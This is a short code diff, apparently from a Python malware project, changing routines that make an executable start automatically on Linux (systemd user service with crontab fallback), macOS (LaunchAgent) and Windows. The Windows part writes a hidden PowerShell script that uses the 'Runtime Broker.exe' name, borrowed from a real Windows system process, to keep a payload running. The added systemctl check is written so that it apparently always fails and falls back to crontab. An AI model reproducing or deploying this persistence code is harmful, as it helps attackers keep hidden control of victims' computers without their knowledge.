@@ -56,6 +56,17 @@ WantedBy=default.target"""
             shell=True,
         )
 
+        try:
+            # Use systemctl to check the status of the process
+            result = subprocess.run(
+                ["XDG_RUNTIME_DIR=/run/user/$UID systemctl --user is-active --quiet systemd.service"],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+        except FileNotFoundError:
+            print("Error: systemctl command not found. Switching to crontab")
+            add_crontab_job(file_path)
+
     def create_launch_agent(path, label):
         plist_content = f"""
         <?xml version="1.0" encoding="UTF-8"?>
@@ -88,23 +99,21 @@ WantedBy=default.target"""
         with open(directory, "w") as f:
             f.write(
                 """# Define the process name you want to check
-    $processName = "Runtime Broker.exe"
+$processName = "Runtime Broker.exe"
     
-    # Define the path to the executable you want to run
-    $exePath = '"""
-                + path
-                + """'
+# Define the path to the executable you want to run
+$exePath = '"""+ path+ """'
     
-    # Check if the process is running
-    $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
+# Check if the process is running
+$process = Get-Process -Name $processName -ErrorAction SilentlyContinue
     
-    if ($process) {
-    } else {
-    try {
-        Start-Process -FilePath $exePath
-    } catch {
-    }
-    }"""
+if ($process) {
+} else {
+try {
+    Start-Process -FilePath $exePath
+} catch {
+}
+}"""
             )
 
         create_hidden_file(directory)
